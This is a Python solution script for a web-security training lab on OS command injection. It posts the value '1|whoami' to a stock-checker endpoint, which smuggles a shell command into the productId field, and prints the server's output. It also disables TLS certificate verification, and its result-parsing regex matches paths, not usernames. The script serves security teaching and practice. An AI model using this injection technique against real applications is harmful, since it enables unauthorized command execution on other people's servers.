"""
Lab: OS command injection, simple case

This lab contains a command injection vulnerability in the stock checker.
The application executes a shell command with user-supplied IDs and returns the raw output in the response.
To solve, execute the whoami command to discover the current user name.

Solution:
1. Send a POST to /product/stock with productId=1|whoami&storeId=1
2. Print the result of the command executed on the server

Author: N00BCYB0T
"""


import argparse
import re
from colorama import Fore
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., https://target-lab.com)')
    parser.add_argument('--proxy', help='HTTP Proxy (e.g., http://127.0.0.1:8080)')
    args = parser.parse_args()

    url = args.url.rstrip('/')
    session = requests.Session()
    if args.proxy:
        session.proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    session.verify = False

    print(f"{Fore.YELLOW}[*] Sending command injection payload...{Fore.RESET}")
    stock_url = f"{url}/product/stock"
    data = {
        "productId": "1|whoami",
        "storeId": "1"
    }
    r = session.post(stock_url, data=data)
    output = r.text.strip()
    print(f"{Fore.GREEN}[+] Server response:{Fore.RESET}\n{output}")

    whoami = extract_whoami(output)
    if whoami:
        print(f"{Fore.GREEN}[+] whoami result: {whoami}{Fore.RESET}")
    else:
        print(f"{Fore.RED}[-] Could not extract whoami result{Fore.RESET}")


def extract_whoami(text):
    # Try to extract the whoami command result or a path like /home/peter-aGZEpu/
    m = re.search(r'(/[\w\-]+)+/?', text)
    if m:
        return m.group(0)
    return None

if __name__ == "__main__":
    main()
